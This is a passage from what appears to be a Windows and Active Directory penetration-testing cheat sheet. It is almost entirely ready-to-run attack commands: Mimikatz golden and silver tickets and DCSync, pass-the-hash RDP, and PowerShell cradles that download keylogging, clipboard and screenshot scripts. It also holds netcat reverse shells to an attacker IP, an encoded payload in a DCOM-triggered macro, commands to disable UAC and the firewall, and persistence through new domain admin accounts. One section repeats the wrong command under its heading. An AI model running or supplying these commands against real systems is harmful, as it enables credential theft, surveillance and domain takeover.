kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```

Golden Ticket
```
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
misc::cmd
psexec.exe \\dc01 cmd.exe
```

DCSync
```
lsadump::dcsync /user:Administrator
```

```bash
xfreerdp /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 /v:$target -O
```

```
winexe -U <user>%<password> //$target cmd.exe
```

## Data Extraction

Import Powersploits invoke-keystrokes
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')"
```

Import Empire's Get-ClipboardContents
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1')"
```
Import Get-TimedScreenshot
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/obscuresec/PowerShell/master/Get-TimedScreenshot')"
```

Use Windows Debug api to pause live processes
```bash
powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/Pause-Process/master/pause-process.ps1');Pause-Process -ID 1180;UnPause-Process -ID 1180;"
```

## Enable / Disable 

Enable RDP:
``` bat
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
```
netsh firewall add portopening TCP 3389 "Open Port 3389" ENABLE ALL
netsh firewall set portopening TCP 3389 proxy ENABLE ALL
netsh firewall set service RemoteDesktop enable
```

Disable UAC:
```bash
reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system reg setval -v EnableLUA -d 0 -t REG_DWORD -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system
```

Disable Firewall:
```bash 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
```
netsh firewall set opmode mode=disable exceptions=disable
```
```
netsh advfirewall set currentprofile state off
netsh advfirewall set allprofiles state off
```

## Admin to SYSTEM
```bash
time
# Now we set the time we want the system CMD to start. Probably one minuter after the time.
at 01:23 /interactive cmd.exe
```
```bash
psexec -i -s cmd.exe
```
```bash
vdmallowed.exe
vdmexploit.dll
```
```bash
getsystem
```
```bash
psexec.exe -i -s %SystemRoot%\system32\cmd.exe
```
```bash
psexec64 \\COMPUTERNAME -u Test -p test -h "//$source_ip/$smb_share/tools_windows/bin/nc.exe -nc $source_ip $source_port -e cmd.exe" 
```
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:Test "//$source_ip/$smb_share/tools_windows/bin/nc.exe -nc $source_ip $source_port -e cmd.exe"
```
```bash
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/bin/nc.exe')"
encode="`echo $scriptblock | iconv -to-code UTF-16LE | base64 -w 0`”
command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
```

## Persistance 
```
net user /add amxuser amxpass1234
net localgroup administrators amxuser /add
net localgroup "Remote Desktop Users" amxuser /add
```
```
net user amxuser amxpass1234 /add /domain
net group "Domain Admins" amxuser /add /domain
```



## Glossery 
```
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```
```
rdesktop (ip) -r disk:share=/home/share
```
Refresh group policy:
```
gpupdate /force
```
Search for a specific file (wildcards are supported)
```
dir /S /P "filename"
```

Test to see if we can run Powershell:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -C "get-host"
```

Test to see if we can run Powershell Version 2:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -w hidden -noni -nop -i None -ex Bypass -C "$PSVersionTable"
```
grep IP:
```
grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
```

```
dir /s /a proof.txt
```
```
findstr /si "proof"
```

## AD 
```
net user /domain
```
Current domain:
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()
```

All objects:
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
# Query witin another user's context
# New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwert y09!")
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
```

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "------------------------"
}
```

Groups
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.name
}
```

Group contents:
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Secret_Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    $obj.Properties.member
}
 
```

Search by SPN:
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://" $SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    } 
}
```

Deleted Objects:
```powershell
Get-ADObject -IncludeDeletedObjects -Filter {Isdeleted -eq $true} -Property *
```
```powershell
Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects -Property *
```

Browse:
```powershell
set-location ad:
```

NetWkstaUserEnum:
```powershell
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client251
```

NetSessionEnum
```powershell
Import-Module .\PowerView.ps1
Get-NetSession -ComputerName dc01
```

Request token for SPN
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

## Powershell

```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

DCOM to run macro
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.2"))
$com | Get-Member
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```
```vb
Sub MyMacro()
Dim Str As String
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Shell (Str)
End Sub
```

Copy file
```powershell
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```